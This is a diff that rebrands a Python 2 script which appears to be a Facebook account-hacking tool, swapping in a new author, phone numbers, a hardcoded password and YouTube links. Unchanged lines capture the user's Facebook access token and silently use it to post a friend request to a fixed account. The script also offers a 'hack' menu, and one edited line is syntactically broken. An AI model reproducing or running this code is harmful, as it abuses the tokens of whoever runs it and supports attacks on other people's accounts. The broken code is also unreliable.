@@ -1,11 +1,11 @@
 #!/usr/bin/python2
 #coding=utf-8
-#Codded By Jam Shahrukh
+#Codded By shadow hacker
 #Editing My Script Will Not Make You A Coder
-#Facebook : JAM Shahrukh
-#Whatsapp : ++971528752764
+#Facebook : iam mis creation/ayesha 
+#Whatsapp : ++03203346497
 #Pakistan Cyber Expert
-#Alone Coder 
+#Alone Coder black hat /Ayesha lover
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
@@ -49,17 +49,17 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.1)
 ##### INTRO #####
-logo ="""
+logo ="""Ayesha name tu suna hoga
 \033[1;91m ───▄▄▄▄▄▄─────▄▄▄▄▄▄
 \033[1;93m ─▄█▓▓▓▓▓▓█▄─▄█▓▓▓▓▓▓█▄
 \033[1;93m ▐█▓▓▒▒▒▒▒▓▓█▓▓▒▒▒▒▒▓▓█▌
 \033[1;94m █▓▓▒▒░╔╗╔═╦═╦═╦═╗░▒▒▓▓█
-\033[1;95m █▓▓▒▒░║╠╣╬╠╗║╔╣╩╣░▒▒▓▓█
-\033[1;96m ▐█▓▓▒▒╚═╩═╝╚═╝╚═╝▒▒▓▓█▌
+\033[1;95m █▓▓▒▒░║╠╣╬╠╗ayesha║╔╣╩╣░▒▒▓▓█
+\033[1;96m ▐█▓▓▒▒╚═╩═╝hacker loves me╚═╝╚═╝▒▒▓▓█▌
 \033[1;97m ─▀█▓▓▒▒░░░░░░░░░▒▒▓▓█▀
 \033[1;98m ───▀█▓▓▒▒░░░░░▒▒▓▓█▀ 
-\033[1;99m ─────▀█▓▓▒▒░▒▒▓▓█▀  
-\033[1;92m ──────▀█▓▓▒▓▓█▀             +923170424820
+\033[1;99m ─────▀█▓▓▒▒░▒▒▓▓█▀  shadow puc you if you teel me anything
+\033[1;92m ──────▀█▓▓▒▓▓█▀    iam hacker ko jan         +923203346497
 \033[1;92m ────────▀█▓█▀                      WhatsApp
 \033[1;93m ──────────▀
 
@@ -81,8 +81,8 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print logo
 
-CorrectUsername = "waqas"
-CorrectPassword = "waqas"
+CorrectUsername = "ayesha"
+CorrectPassword = "creation"
 
 loop = 'true'
 while (loop == 'true'):
@@ -95,10 +95,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mdone"
-            os.system('xdg-open https://www.youtube.com/channel/UCd-xhGAkBU4_0l0CIqwxTjw')
+            os.system('xdg-open https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
     else:
         print "\033[1;97mACCESS DENIED"
-        os.system('xdg-open https://www.youtube.com/channel/UCd-xhGAkBU4_0l0CIqwxTjw')
+        os.system('xdg-open https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 def login():
 	os.system('clear')
 	try:
@@ -110,7 +110,7 @@ def login():
      	
 		
 		jalan('  \033[1;94mWarning: \033[1;94mUse a New Account To Login' )
-		jalan(' \033[1;94mbro subscribe  YouTube' ) 
+		jalan(' \033[1;94mbro subscribe  YouTube' UCDKRvmw7ufXejkYXG51liKA) 
 		
 		print('	' )
 		print('      \033[1;94m      ✧ \x1b[1;92mLogin With Facebook\x1b[1;97m ✧')
@@ -143,7 +143,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;94mSuccessfully'
-				os.system('xdg-open https://www.youtube.com/channel/UCd-xhGAkBU4_0l0CIqwxTjw')
+				os.system('xdg-open https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -208,7 +208,7 @@ def hop():
 	elif hack =="1":
 		super()
 	elif hack =="2":
-	        os.system('xdg-open https://www.youtube.com/channel/UCd-xhGAkBU4_0l0CIqwxTjw')
+	        os.system('xdg-open https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 	        menu()
         
 	elif hack =="0":
